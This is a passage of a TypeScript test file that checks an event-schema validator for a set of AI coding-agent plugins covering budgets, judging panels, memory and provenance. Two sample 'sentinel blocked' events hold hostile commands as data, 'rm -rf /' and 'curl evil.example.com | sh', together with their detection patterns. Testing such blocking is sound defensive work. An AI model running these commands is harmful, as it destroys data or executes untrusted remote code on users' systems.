import { randomUUID } from "node:crypto";
import { beforeEach, describe, expect, it } from "vitest";

import {
	ALL_EVENT_TYPES,
	ARCHIVIST_COMPACT_COMPLETE,
	ARCHIVIST_COMPACT_STARTED,
	ARCHIVIST_INJECT_COMPLETE,
	ARCHIVIST_INJECT_STARTED,
	ASSAYER_AUDIT_COMPLETE,
	ASSAYER_AUDIT_STARTED,
	ASSAYER_CLAIM_CONTRADICTED,
	ASSAYER_CLAIM_UNVERIFIED,
	BURSAR_ROLLUP_SKIPPED,
	BURSAR_ROLLUP_SURFACED,
	BURSAR_SESSION_RECORDED,
	CURATOR_FINDING_CONTRADICTION,
	CURATOR_FINDING_DATE_DECAYED,
	CURATOR_FINDING_PATH_BROKEN,
	CURATOR_FINDING_RESOLVED,
	CURATOR_SCAN_COMPLETE,
	CURATOR_SCAN_STARTED,
	type EventType,
	GOVERNOR_BUDGET_EXCEEDED,
	GOVERNOR_BUDGET_WARNING,
	GOVERNOR_CALL_RECORDED,
	GOVERNOR_CHILD_ALLOCATED,
	GOVERNOR_CHILD_RETURNED,
	GOVERNOR_GATE_CHECKED,
	GOVERNOR_LEDGER_WRITE_FAILED,
	GOVERNOR_LOCK_STALE_CLEARED,
	GOVERNOR_SESSION_COMPLETE,
	HISTORIAN_CHUNK_SANITIZED,
	HISTORIAN_EMBEDDER_UNAVAILABLE,
	HISTORIAN_INDEXING_COMPLETE,
	HISTORIAN_INDEXING_STARTED,
	HISTORIAN_RETRIEVAL_COMPLETE,
	HISTORIAN_RETRIEVAL_STARTED,
	HISTORIAN_RETRIEVAL_SURFACED,
	isEventType,
	LIBRARIAN_CANDIDATE_DROPPED,
	LIBRARIAN_CANDIDATE_PROPOSED,
	LIBRARIAN_PROPOSAL_ACCEPTED,
	LIBRARIAN_SCAN_COMPLETE,
	LIBRARIAN_SCAN_STARTED,
	LINEAGE_CHANGE_RECORDED,
	LINEAGE_QUERY_ANSWERED,
	MEMORY_RECALLED,
	MERIDIAN_HINT_GENERATED,
	SENTINEL_BLOCKED,
	SESSION_START,
	TRIBUNAL_ACTOR_COMPLETE,
	TRIBUNAL_ACTOR_START,
	TRIBUNAL_CONSENSUS_REACHED,
	TRIBUNAL_DISSENT_RECORDED,
	TRIBUNAL_GATE_BLOCKED,
	TRIBUNAL_GATE_PASSED,
	TRIBUNAL_ITERATION_START,
	TRIBUNAL_JUDGE_START,
	TRIBUNAL_JURY_EMPANELED,
	TRIBUNAL_META_COMPLETE,
	TRIBUNAL_META_START,
	TRIBUNAL_SESSION_COMPLETE,
	TRIBUNAL_SESSION_START,
	TRIBUNAL_VERDICT,
} from "./event-types.js";
import type { OnlookerEvent } from "./types.js";
import {
	_resetSequence,
	createEvent,
	isEventOfType,
	validate,
	validateOrThrow,
} from "./validate.js";

const MACHINE_ID = "11111111-2222-3333-4444-555555555555";
const SESSION_ID = "session-abc";

function baseValid(): OnlookerEvent<typeof SESSION_START> {
	return {
		id: randomUUID(),
		schema_version: "1.0",
		runtime: "claude-code",
		plugin: "core",
		machine_id: MACHINE_ID,
		timestamp: new Date().toISOString(),
		session_id: SESSION_ID,
		sequence: 0,
		event_type: SESSION_START,
		payload: { working_directory: "/tmp" },
		redacted: false,
	};
}

describe("validate", () => {
	beforeEach(() => {
		_resetSequence();
	});

	it("accepts a valid event", () => {
		const result = validate(baseValid());
		expect(result.valid).toBe(true);
	});

	it("rejects missing required fields", () => {
		const event = baseValid() as unknown as Record<string, unknown>;
		delete event.session_id;
		const result = validate(event);
		expect(result.valid).toBe(false);
		if (!result.valid) {
			expect(result.errors.some((e) => e.path.includes("session_id"))).toBe(
				true,
			);
		}
	});

	it("rejects unknown event_type", () => {
		const event = { ...baseValid(), event_type: "not.a.real.event" };
		const result = validate(event);
		expect(result.valid).toBe(false);
		if (!result.valid) {
			expect(result.errors.some((e) => e.path.includes("event_type"))).toBe(
				true,
			);
		}
	});

	it("rejects wrong schema_version", () => {
		const event = { ...baseValid(), schema_version: "2.0" };
		const result = validate(event);
		expect(result.valid).toBe(false);
		if (!result.valid) {
			expect(result.errors.some((e) => e.path.includes("schema_version"))).toBe(
				true,
			);
		}
	});

	it("rejects malformed timestamp", () => {
		const event = { ...baseValid(), timestamp: "yesterday at noon" };
		const result = validate(event);
		expect(result.valid).toBe(false);
		if (!result.valid) {
			expect(result.errors.some((e) => e.path.includes("timestamp"))).toBe(
				true,
			);
		}
	});

	it("rejects non-UUID machine_id", () => {
		const event = { ...baseValid(), machine_id: "not-a-uuid" };
		const result = validate(event);
		expect(result.valid).toBe(false);
		if (!result.valid) {
			expect(result.errors.some((e) => e.path.includes("machine_id"))).toBe(
				true,
			);
		}
	});

	it("rejects negative sequence", () => {
		const event = { ...baseValid(), sequence: -1 };
		const result = validate(event);
		expect(result.valid).toBe(false);
		if (!result.valid) {
			expect(result.errors.some((e) => e.path.includes("sequence"))).toBe(true);
		}
	});

	it("rejects unknown runtime", () => {
		const event = { ...baseValid(), runtime: "emacs" };
		const result = validate(event);
		expect(result.valid).toBe(false);
		if (!result.valid) {
			expect(result.errors.some((e) => e.path.includes("runtime"))).toBe(true);
		}
	});

	it("accepts optional fields", () => {
		const event = {
			...baseValid(),
			adapter_id: "claude-code-v1",
			cost_usd: 0.42,
			token_count: 1024,
		};
		const result = validate(event);
		expect(result.valid).toBe(true);
	});
});

describe("validateOrThrow", () => {
	beforeEach(() => {
		_resetSequence();
	});

	it("returns event for valid input", () => {
		const event = baseValid();
		const result = validateOrThrow(event);
		expect(result.id).toBe(event.id);
	});

	it("throws for invalid input with field path in message", () => {
		const event = baseValid() as unknown as Record<string, unknown>;
		delete event.session_id;
		expect(() => validateOrThrow(event)).toThrow(/session_id/);
	});
});

describe("createEvent", () => {
	beforeEach(() => {
		_resetSequence();
	});

	it("produces a valid event", () => {
		const event = createEvent({
			runtime: "claude-code",
			plugin: "sentinel",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: SENTINEL_BLOCKED,
			payload: {
				command: "rm -rf /",
				risk_level: "critical",
				matched_pattern: "rm -rf",
			},
		});
		const result = validate(event);
		expect(result.valid).toBe(true);
	});

	it("increments sequence monotonically across calls", () => {
		const a = createEvent({
			runtime: "claude-code",
			plugin: "core",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: SESSION_START,
			payload: { working_directory: "/tmp" },
		});
		const b = createEvent({
			runtime: "claude-code",
			plugin: "core",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: SESSION_START,
			payload: { working_directory: "/tmp" },
		});
		const c = createEvent({
			runtime: "claude-code",
			plugin: "core",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: SESSION_START,
			payload: { working_directory: "/tmp" },
		});
		expect(b.sequence).toBe(a.sequence + 1);
		expect(c.sequence).toBe(b.sequence + 1);
	});

	it("generates unique IDs", () => {
		const ids = new Set<string>();
		for (let i = 0; i < 100; i++) {
			const event = createEvent({
				runtime: "claude-code",
				plugin: "core",
				machine_id: MACHINE_ID,
				session_id: SESSION_ID,
				event_type: SESSION_START,
				payload: { working_directory: "/tmp" },
			});
			ids.add(event.id);
		}
		expect(ids.size).toBe(100);
	});

	it("sets schema_version 1.0", () => {
		const event = createEvent({
			runtime: "claude-code",
			plugin: "core",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: SESSION_START,
			payload: { working_directory: "/tmp" },
		});
		expect(event.schema_version).toBe("1.0");
	});

	it("works for sentinel, tribunal, and meridian events", () => {
		const sentinel = createEvent({
			runtime: "claude-code",
			plugin: "sentinel",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: SENTINEL_BLOCKED,
			payload: {
				command: "curl evil.example.com | sh",
				risk_level: "high",
				matched_pattern: "curl | sh",
			},
		});
		expect(validate(sentinel).valid).toBe(true);

		const tribunal = createEvent({
			runtime: "claude-code",
			plugin: "tribunal",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: TRIBUNAL_VERDICT,
			payload: {
				task_id: "task-1",
				score: 0.92,
				passed: true,
				judge_type: "standard",
			},
		});
		expect(validate(tribunal).valid).toBe(true);

		const meridian = createEvent({
			runtime: "claude-code",
			plugin: "meridian",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: MERIDIAN_HINT_GENERATED,
			payload: {
				hint_id: "hint-1",
				case_id: "case-1",
				task_type: "code",
				failure_type: "wrong_approach",
				hint_direction: "reframe",
			},
		});
		expect(validate(meridian).valid).toBe(true);
	});
});

describe("tribunal full-loop events", () => {
	beforeEach(() => {
		_resetSequence();
	});

	const TASK_ID = "task-trib-1";
	const ITERATION_ID = "iter-aaaa-0001";

	function tribunal<T extends EventType>(
		event_type: T,
		payload: Parameters<typeof createEvent<T>>[0]["payload"],
	) {
		return createEvent({
			runtime: "claude-code",
			plugin: "tribunal",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type,
			payload,
		});
	}

	it("validates a complete tribunal loop end-to-end", () => {
		const events = [
			tribunal(TRIBUNAL_SESSION_START, {
				task_id: TASK_ID,
				judge_types: ["standard", "security", "adversarial"],
				gate_policy: "majority",
				score_threshold: 0.8,
				max_iterations: 3,
				actor_model_id: "claude-opus-4-7",
				judge_model_ids: ["claude-sonnet-4-6", "claude-sonnet-4-6"],
				meta_model_id: "claude-opus-4-7",
			}),
			tribunal(TRIBUNAL_ITERATION_START, {
				task_id: TASK_ID,
				iteration_id: ITERATION_ID,
				iteration_number: 0,
				trigger: "initial",
			}),
			tribunal(TRIBUNAL_ACTOR_START, {
				task_id: TASK_ID,
				iteration_id: ITERATION_ID,
				iteration_number: 0,
				actor_model_id: "claude-opus-4-7",
			}),
			tribunal(TRIBUNAL_ACTOR_COMPLETE, {
				task_id: TASK_ID,
				success: true,
				duration_ms: 4200,
				iteration_id: ITERATION_ID,
				iteration_number: 0,
				artifact_kind: "patch",
				actor_model_id: "claude-opus-4-7",
			}),
			tribunal(TRIBUNAL_JURY_EMPANELED, {
				task_id: TASK_ID,
				iteration_id: ITERATION_ID,
				panel_size: 2,
				judges: [
					{
						judge_id: "j-1",
						judge_type: "security",
						model_id: "claude-sonnet-4-6",
					},
					{
						judge_id: "j-2",
						judge_type: "adversarial",
						model_id: "claude-sonnet-4-6",
					},
				],
			}),
			tribunal(TRIBUNAL_JUDGE_START, {
				task_id: TASK_ID,
				iteration_id: ITERATION_ID,
				judge_id: "j-1",
				judge_type: "security",
				judge_model_id: "claude-sonnet-4-6",
			}),
			tribunal(TRIBUNAL_VERDICT, {
				task_id: TASK_ID,
				score: 0.85,
				passed: true,
				judge_type: "security",
				iteration_id: ITERATION_ID,
				judge_id: "j-1",
				judge_model_id: "claude-sonnet-4-6",
				criteria_evaluated: ["input_validation", "secrets_handling"],
				strengths_count: 3,
				weaknesses_count: 1,
				confidence: 0.9,
			}),
			tribunal(TRIBUNAL_CONSENSUS_REACHED, {
				task_id: TASK_ID,
				iteration_id: ITERATION_ID,
				aggregated_score: 0.83,
				passed: true,
				aggregation_method: "mean",
				judges: [
					{ judge_id: "j-1", score: 0.85 },
					{ judge_id: "j-2", score: 0.81 },
				],
			}),
			tribunal(TRIBUNAL_META_START, {
				task_id: TASK_ID,
				iteration_id: ITERATION_ID,
				meta_model_id: "claude-opus-4-7",
				verdicts_reviewed: 2,
			}),
			tribunal(TRIBUNAL_META_COMPLETE, {
				task_id: TASK_ID,
				verdict_quality: "sound",
				bias_detected: false,
				override_recommendation: "accept",
				iteration_id: ITERATION_ID,
				bias_types: [],
				confidence: 0.88,
				meta_model_id: "claude-opus-4-7",
			}),
			tribunal(TRIBUNAL_GATE_PASSED, {
				task_id: TASK_ID,
				iteration_id: ITERATION_ID,
				final_score: 0.83,
				iteration_number: 0,
				judges_consulted: 2,
			}),
			tribunal(TRIBUNAL_SESSION_COMPLETE, {
				task_id: TASK_ID,
				outcome: "accepted",
				final_score: 0.83,
				iterations_used: 1,
				total_cost_usd: 0.42,
				total_duration_ms: 12345,
			}),
		];

		for (const event of events) {
			const result = validate(event);
			if (!result.valid) {
				throw new Error(
					`expected ${event.event_type} to validate, got: ${result.errors
						.map((e) => `${e.path}: ${e.message}`)
						.join("; ")}`,
				);
			}
		}
	});

	it("validates dissent + gate.blocked + bias_detected paths", () => {
		const dissent = tribunal(TRIBUNAL_DISSENT_RECORDED, {
			task_id: TASK_ID,
			iteration_id: ITERATION_ID,
			disagreement_score: 0.6,
			judges: [
				{ judge_id: "j-1", score: 0.9, passed: true },
				{ judge_id: "j-2", score: 0.3, passed: false },
			],
			resolution: "meta_override",
		});
		expect(validate(dissent).valid).toBe(true);

		const blocked = tribunal(TRIBUNAL_GATE_BLOCKED, {
			task_id: TASK_ID,
			iteration_id: ITERATION_ID,
			reason: "dissent_unresolved",
			final_score: 0.5,
			iteration_number: 1,
			will_retry: true,
			retry_iteration_number: 2,
		});
		expect(validate(blocked).valid).toBe(true);

		const biased = tribunal(TRIBUNAL_META_COMPLETE, {
			task_id: TASK_ID,
			verdict_quality: "biased",
			bias_detected: true,
			bias_types: ["self_enhancement", "verbosity"],
			override_recommendation: "re-evaluate",
			iteration_id: ITERATION_ID,
			confidence: 0.71,
		});
		expect(validate(biased).valid).toBe(true);
	});
});

describe("archivist lifecycle events", () => {
	beforeEach(() => {
		_resetSequence();
	});

	it("validates compact and inject lifecycle round-trip", () => {
		const PROJECT_KEY = "my-project";
		const SID = "session-archivist-1";

		const events = [
			createEvent({
				runtime: "claude-code",
				plugin: "archivist",
				machine_id: MACHINE_ID,
				session_id: SESSION_ID,
				event_type: ARCHIVIST_COMPACT_STARTED,
				payload: { project_key: PROJECT_KEY, session_id: SID },
			}),
			createEvent({
				runtime: "claude-code",
				plugin: "archivist",
				machine_id: MACHINE_ID,
				session_id: SESSION_ID,
				event_type: ARCHIVIST_COMPACT_COMPLETE,
				payload: {
					project_key: PROJECT_KEY,
					session_id: SID,
					decisions_extracted: 3,
					dead_ends_extracted: 1,
					open_questions_extracted: 2,
					duration_ms: 420,
				},
			}),
			createEvent({
				runtime: "claude-code",
				plugin: "archivist",
				machine_id: MACHINE_ID,
				session_id: SESSION_ID,
				event_type: ARCHIVIST_INJECT_STARTED,
				payload: { project_key: PROJECT_KEY, session_id: SID },
			}),
			createEvent({
				runtime: "claude-code",
				plugin: "archivist",
				machine_id: MACHINE_ID,
				session_id: SESSION_ID,
				event_type: ARCHIVIST_INJECT_COMPLETE,
				payload: {
					project_key: PROJECT_KEY,
					session_id: SID,
					items_injected: 6,
					chars_injected: 1024,
				},
			}),
		];

		for (const event of events) {
			const result = validate(event);
			if (!result.valid) {
				throw new Error(
					`expected ${event.event_type} to validate, got: ${result.errors
						.map((e) => `${e.path}: ${e.message}`)
						.join("; ")}`,
				);
			}
		}
	});
});

describe("governor lifecycle events", () => {
	beforeEach(() => {
		_resetSequence();
	});

	const SID = "session-gov-1";
	const PARENT = "agent-orchestrator";
	const CHILD = "agent-actor-1";

	function gov<T extends EventType>(
		event_type: T,
		payload: Parameters<typeof createEvent<T>>[0]["payload"],
	) {
		return createEvent({
			runtime: "claude-code",
			plugin: "governor",
			machine_id: MACHINE_ID,
			session_id: SID,
			event_type,
			payload,
		});
	}

	it("validates a full enforcement lifecycle end-to-end", () => {
		const events = [
			gov(GOVERNOR_LOCK_STALE_CLEARED, {
				lock_path: "/tmp/governor.lock",
				lock_age_seconds: 45.2,
				pid_verified_dead: true,
			}),
			gov(GOVERNOR_GATE_CHECKED, {
				session_id: SID,
				agent_id: PARENT,
				agent_type: "actor",
				decision: "allow",
				estimated_tokens: 8000,
				tokens_available: 50000,
				estimation_method: "tiktoken",
				safety_margin: 1.3,
			}),
			gov(GOVERNOR_CHILD_ALLOCATED, {
				session_id: SID,
				parent_agent_id: PARENT,
				child_agent_id: CHILD,
				child_agent_type: "judge",
				tokens_allocated: 10000,
				cost_usd_allocated: 0.05,
				tokens_remaining_after_allocation: 40000,
				conservation_check_passed: true,
			}),
			gov(GOVERNOR_CALL_RECORDED, {
				session_id: SID,
				agent_id: CHILD,
				agent_type: "judge",
				estimated_tokens: 8000,
				actual_tokens: 7200,
				estimation_error_pct: -10,
				cost_usd_estimated: 0.04,
				cost_usd_actual: 0.036,
				duration_ms: 1800,
				tokens_returned_to_pool: 800,
			}),
			gov(GOVERNOR_CHILD_RETURNED, {
				session_id: SID,
				parent_agent_id: PARENT,
				child_agent_id: CHILD,
				tokens_allocated: 10000,
				tokens_consumed: 7200,
				tokens_returned: 2800,
			}),
			gov(GOVERNOR_BUDGET_WARNING, {
				session_id: SID,
				budget_usd: 1.0,
				spent_usd: 0.8,
				threshold_pct: 80,
				dimension: "cost_usd",
				remaining_usd: 0.2,
			}),
			gov(GOVERNOR_BUDGET_EXCEEDED, {
				session_id: SID,
				agent_id: PARENT,
				budget_usd: 1.0,
				spent_usd: 1.02,
				blocked_operation: "tool.agent.spawn",
				dimension: "cost_usd",
				estimated_call_cost: 0.05,
				ceiling_type: "session",
			}),
			gov(GOVERNOR_SESSION_COMPLETE, {
				session_id: SID,
				total_cost_usd: 1.02,
				budget_usd: 1.0,
				under_budget: false,
				total_tokens: 42000,
				total_api_calls: 12,
				duration_ms: 34000,
				calls_blocked: 1,
				calls_warned: 2,
				ledger_poisoned: false,
				estimation_accuracy_pct: 94.5,
			}),
		];

		for (const event of events) {
			const result = validate(event);
			if (!result.valid) {
				throw new Error(
					`expected ${event.event_type} to validate, got: ${result.errors
						.map((e) => `${e.path}: ${e.message}`)
						.join("; ")}`,
				);
			}
		}
	});

	it("validates governor.ledger.write_failed poisoned path", () => {
		const event = gov(GOVERNOR_LEDGER_WRITE_FAILED, {
			session_id: SID,
			agent_id: CHILD,
			error: "SQLITE_BUSY: database is locked",
			retry_count: 3,
			ledger_poisoned: true,
			unrecorded_tokens: 7200,
		});
		expect(validate(event).valid).toBe(true);
	});

	it("validates gate.checked block decision", () => {
		const event = gov(GOVERNOR_GATE_CHECKED, {
			session_id: SID,
			agent_id: PARENT,
			agent_type: "actor",
			decision: "block",
			reason: "budget_exceeded",
			estimated_tokens: 15000,
			tokens_available: 5000,
			estimation_method: "char_ratio",
			safety_margin: 1.3,
		});
		expect(validate(event).valid).toBe(true);
	});

	it("validates governor.call.recorded estimates-only (no actuals)", () => {
		const event = gov(GOVERNOR_CALL_RECORDED, {
			session_id: SID,
			agent_id: CHILD,
			agent_type: "judge",
			estimated_tokens: 8000,
			cost_usd_estimated: 0.04,
			duration_ms: 1800,
		});
		expect(validate(event).valid).toBe(true);
	});

	it("validates governor.call.recorded with negative tokens_returned_to_pool (underestimate)", () => {
		const event = gov(GOVERNOR_CALL_RECORDED, {
			session_id: SID,
			agent_id: CHILD,
			agent_type: "judge",
			estimated_tokens: 8000,
			actual_tokens: 9500,
			estimation_error_pct: 18.75,
			cost_usd_estimated: 0.04,
			cost_usd_actual: 0.0475,
			duration_ms: 2100,
			tokens_returned_to_pool: -1500,
		});
		expect(validate(event).valid).toBe(true);
	});
});

describe("bursar rollup events", () => {
	beforeEach(() => {
		_resetSequence();
	});

	const PROJECT_KEY = "a1b2c3d4e5f6";
	const SID = "session-bursar-1";

	function bursar<T extends EventType>(
		event_type: T,
		payload: Parameters<typeof createEvent<T>>[0]["payload"],
	) {
		return createEvent({
			runtime: "claude-code",
			plugin: "bursar",
			machine_id: MACHINE_ID,
			session_id: SID,
			event_type,
			payload,
		});
	}

	it("validates a session-record + rollup-surface round-trip", () => {
		const events = [
			bursar(BURSAR_SESSION_RECORDED, {
				project_key: PROJECT_KEY,
				session_id: SID,
				governor_present: true,
				cost_usd: 0.42,
				tokens: 42000,
				api_calls: 12,
				model: "claude-opus-4-8",
			}),
			bursar(BURSAR_ROLLUP_SURFACED, {
				project_key: PROJECT_KEY,
				window: "rolling_7d",
				total_cost_usd: 3.17,
				session_count: 8,
				total_tokens: 310000,
				sessions_with_cost: 7,
				window_start: "2026-06-05T00:00:00Z",
			}),
		];

		for (const event of events) {
			const result = validate(event);
			if (!result.valid) {
				throw new Error(
					`expected ${event.event_type} to validate, got: ${result.errors
						.map((e) => `${e.path}: ${e.message}`)
						.join("; ")}`,
				);
			}
		}
	});

	it("validates bursar.session.recorded with governor absent (no cost)", () => {
		const event = bursar(BURSAR_SESSION_RECORDED, {
			project_key: PROJECT_KEY,
			session_id: SID,
			governor_present: false,
		});
		expect(validate(event).valid).toBe(true);
	});

	it("validates bursar.rollup.surfaced for calendar_week", () => {
		const event = bursar(BURSAR_ROLLUP_SURFACED, {
			project_key: PROJECT_KEY,
			window: "calendar_week",
			total_cost_usd: 0,
			session_count: 0,
			total_tokens: 0,
			sessions_with_cost: 0,
		});
		expect(validate(event).valid).toBe(true);
	});

	it("validates bursar.rollup.skipped reasons", () => {
		for (const reason of ["disabled", "no_data", "error"] as const) {
			const event = bursar(BURSAR_ROLLUP_SKIPPED, { reason });
			expect(validate(event).valid).toBe(true);
		}
	});

	it("rejects bursar.session.recorded missing governor_present", () => {
		const event = bursar(BURSAR_SESSION_RECORDED, {
			project_key: PROJECT_KEY,
			session_id: SID,
		} as never);
		expect(validate(event).valid).toBe(false);
	});
});

describe("lineage provenance events", () => {
	beforeEach(() => {
		_resetSequence();
	});

	const PROJECT_KEY = "a1b2c3d4e5f6";
	const SID = "session-lineage-1";

	function lineage<T extends EventType>(
		event_type: T,
		payload: Parameters<typeof createEvent<T>>[0]["payload"],
	) {
		return createEvent({
			runtime: "claude-code",
			plugin: "lineage",
			machine_id: MACHINE_ID,
			session_id: SID,
			event_type,
			payload,
		});
	}

	it("validates a change-record + query-answered round-trip", () => {
		const events = [
			lineage(LINEAGE_CHANGE_RECORDED, {
				project_key: PROJECT_KEY,
				session_id: SID,
				file_path: "src/main.ts",
				tool: "Edit",
				operation: "edit",
				change_id: "01J0000000000000000000LNG1",
				turn: 4,
				tool_use_id: "toolu_edit_001",
				agent_type: "main",
				lines_added: 3,
				lines_removed: 1,
				bytes: 142,
				content_sha256:
					"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
			}),
			lineage(LINEAGE_QUERY_ANSWERED, {
				project_key: PROJECT_KEY,
				file_path: "src/main.ts",
				matches: 2,
				query: "src/main.ts:42",
				line: 42,
				resolved_via: "historian",
			}),
		];

		for (const event of events) {
			const result = validate(event);
			if (!result.valid) {
				throw new Error(
					`expected ${event.event_type} to validate, got: ${result.errors
						.map((e) => `${e.path}: ${e.message}`)
						.join("; ")}`,
				);
			}
		}
	});

	it("validates a minimal Write change record", () => {
		const event = lineage(LINEAGE_CHANGE_RECORDED, {
			project_key: PROJECT_KEY,
			session_id: SID,
			file_path: "README.md",
			tool: "Write",
			operation: "create",
		});
		expect(validate(event).valid).toBe(true);
	});

	it("validates a query answered with no matches", () => {
		const event = lineage(LINEAGE_QUERY_ANSWERED, {
			project_key: PROJECT_KEY,
			file_path: "src/gone.ts",
			matches: 0,
			resolved_via: "none",
		});
		expect(validate(event).valid).toBe(true);
	});

	it("rejects an unknown tool enum on lineage.change.recorded", () => {
		const event = lineage(LINEAGE_CHANGE_RECORDED, {
			project_key: PROJECT_KEY,
			session_id: SID,
			file_path: "src/main.ts",
			tool: "NotebookEdit",
			operation: "edit",
		} as never);
		expect(validate(event).valid).toBe(false);
	});
});

describe("librarian lifecycle events", () => {
	beforeEach(() => {
		_resetSequence();
	});

	const SID = "session-lib-1";
	const PROPOSAL_ID = "01J5LIBPROPOSAL000000000000";
	const ARTIFACT_ID = "01J5ARCHIVISTART00000000000";

	function lib<T extends EventType>(
		event_type: T,
		payload: Parameters<typeof createEvent<T>>[0]["payload"],
	) {
		return createEvent({
			runtime: "claude-code",
			plugin: "librarian",
			machine_id: MACHINE_ID,
			session_id: SID,
			event_type,
			payload,
		});
	}

	it("validates a full scan-to-acceptance flow", () => {
		const events = [
			lib(LIBRARIAN_SCAN_STARTED, {
				trigger: "session_end",
				last_scan_at: "2026-06-01T00:00:00Z",
				artifact_count_in_window: 12,
			}),
			lib(LIBRARIAN_CANDIDATE_PROPOSED, {
				proposal_id: PROPOSAL_ID,
				memory_type: "feedback",
				classifier_confidence: 0.84,
				conflict_state: "none",
				source_artifact_ids: [ARTIFACT_ID],
			}),
			lib(LIBRARIAN_CANDIDATE_DROPPED, {
				reason: "low_confidence",
				source_artifact_id: ARTIFACT_ID,
			}),
			lib(LIBRARIAN_SCAN_COMPLETE, {
				outcome: "ok",
				candidates_proposed: 1,
				candidates_dropped: 4,
				duration_ms: 1320,
				artifact_count_in_window: 12,
			}),
			lib(LIBRARIAN_PROPOSAL_ACCEPTED, {
				proposal_id: PROPOSAL_ID,
				final_filename: "feedback_no_trailing_summaries.md",
				accepted_via: "manual",
			}),
		];

		for (const event of events) {
			const result = validate(event);
			if (!result.valid) {
				throw new Error(
					`expected ${event.event_type} to validate, got: ${result.errors
						.map((e) => `${e.path}: ${e.message}`)
						.join("; ")}`,
				);
			}
		}
	});

	it("validates conflict_candidate proposal", () => {
		const event = lib(LIBRARIAN_CANDIDATE_PROPOSED, {
			proposal_id: PROPOSAL_ID,
			memory_type: "project",
			classifier_confidence: 0.71,
			conflict_state: "conflict_candidate",
			source_artifact_ids: [ARTIFACT_ID, "01J5ARCHIVISTART00000000001"],
		});
		expect(validate(event).valid).toBe(true);
	});

	it("validates scan.complete skipped path", () => {
		const event = lib(LIBRARIAN_SCAN_COMPLETE, {
			outcome: "skipped",
			skip_reason: "archivist_not_present",
			duration_ms: 4,
		});
		expect(validate(event).valid).toBe(true);
	});
});

describe("curator lifecycle events", () => {
	beforeEach(() => {
		_resetSequence();
	});

	const SID = "session-cur-1";
	const FINDING_ID = "01J5CURFINDING000000000000";

	function cur<T extends EventType>(
		event_type: T,
		payload: Parameters<typeof createEvent<T>>[0]["payload"],
	) {
		return createEvent({
			runtime: "claude-code",
			plugin: "curator",
			machine_id: MACHINE_ID,
			session_id: SID,
			event_type,
			payload,
		});
	}

	it("validates cheap-tier scan with mixed findings", () => {
		const events = [
			cur(CURATOR_SCAN_STARTED, { mode: "cheap" }),
			cur(CURATOR_FINDING_DATE_DECAYED, {
				finding_id: FINDING_ID,
				memory_file: "project_merge_freeze.md",
				matched_phrase: "2026-03-05",
				days_past: 89,
			}),
			cur(CURATOR_FINDING_PATH_BROKEN, {
				finding_id: "01J5CURFINDING000000000001",
				memory_file: "reference_legacy_ingest.md",
				broken_path: "scripts/legacy_ingest.py",
			}),
			cur(CURATOR_SCAN_COMPLETE, {
				mode: "cheap",
				outcome: "ok",
				findings_new: 2,
				findings_resolved: 0,
				duration_ms: 87,
			}),
		];

		for (const event of events) {
			const result = validate(event);
			if (!result.valid) {
				throw new Error(
					`expected ${event.event_type} to validate, got: ${result.errors
						.map((e) => `${e.path}: ${e.message}`)
						.join("; ")}`,
				);
			}
		}
	});

	it("validates LLM-sweep contradiction finding", () => {
		const event = cur(CURATOR_FINDING_CONTRADICTION, {
			finding_id: FINDING_ID,
			memory_a: "user_prefer_functional.md",
			memory_b: "feedback_use_class_for_hot_path.md",
			rationale: "Both rules trigger on the same hot-path code shape.",
		});
		expect(validate(event).valid).toBe(true);
	});

	it("validates scan.complete with skip_reason", () => {
		const event = cur(CURATOR_SCAN_COMPLETE, {
			mode: "llm",
			outcome: "skipped",
			skip_reason: "llm_interval_not_elapsed",
			findings_new: 0,
			findings_resolved: 0,
			duration_ms: 3,
		});
		expect(validate(event).valid).toBe(true);
	});

	it("validates finding resolution actions", () => {
		const event = cur(CURATOR_FINDING_RESOLVED, {
			finding_id: FINDING_ID,
			action: "prune",
		});
		expect(validate(event).valid).toBe(true);
	});
});

describe("historian lifecycle events", () => {
	beforeEach(() => {
		_resetSequence();
	});

	const SID = "session-hist-1";
	const CHUNK_ID = "01J5HISTCHUNK0000000000000";

	function hist<T extends EventType>(
		event_type: T,
		payload: Parameters<typeof createEvent<T>>[0]["payload"],
	) {
		return createEvent({
			runtime: "claude-code",
			plugin: "historian",
			machine_id: MACHINE_ID,
			session_id: SID,
			event_type,
			payload,
		});
	}

	it("validates end-to-end indexing then retrieval round-trip", () => {
		const events = [
			hist(HISTORIAN_INDEXING_STARTED, {
				session_id: SID,
				transcript_chars: 10240,
			}),
			hist(HISTORIAN_CHUNK_SANITIZED, {
				chunk_id: CHUNK_ID,
				redaction_count: 2,
			}),
			hist(HISTORIAN_INDEXING_COMPLETE, {
				outcome: "ok",
				chunks_indexed: 18,
				chunks_dropped: 1,
				duration_ms: 1820,
			}),
			hist(HISTORIAN_RETRIEVAL_STARTED, { prompt_chars: 240 }),
			hist(HISTORIAN_RETRIEVAL_SURFACED, {
				chunk_id: CHUNK_ID,
				similarity: 0.72,
				age_days: 47,
				source_session_id: "01J5PASTSESSION00000000000",
			}),
			hist(HISTORIAN_RETRIEVAL_COMPLETE, {
				outcome: "surfaced",
				top_similarity: 0.72,
				candidates_above_floor: 3,
				duration_ms: 68,
			}),
		];

		for (const event of events) {
			const result = validate(event);
			if (!result.valid) {
				throw new Error(
					`expected ${event.event_type} to validate, got: ${result.errors
						.map((e) => `${e.path}: ${e.message}`)
						.join("; ")}`,
				);
			}
		}
	});

	it("validates indexing.complete skipped path", () => {
		const event = hist(HISTORIAN_INDEXING_COMPLETE, {
			outcome: "skipped",
			skip_reason: "embedder_unavailable",
			duration_ms: 1,
		});
		expect(validate(event).valid).toBe(true);
	});

	it("validates embedder.unavailable diagnostic", () => {
		const event = hist(HISTORIAN_EMBEDDER_UNAVAILABLE, {
			backend: "ollama",
			error_summary: "connection refused on http://127.0.0.1:11434",
		});
		expect(validate(event).valid).toBe(true);
	});

	it("validates retrieval.complete skipped on cooldown", () => {
		const event = hist(HISTORIAN_RETRIEVAL_COMPLETE, {
			outcome: "skipped",
			skip_reason: "cooldown",
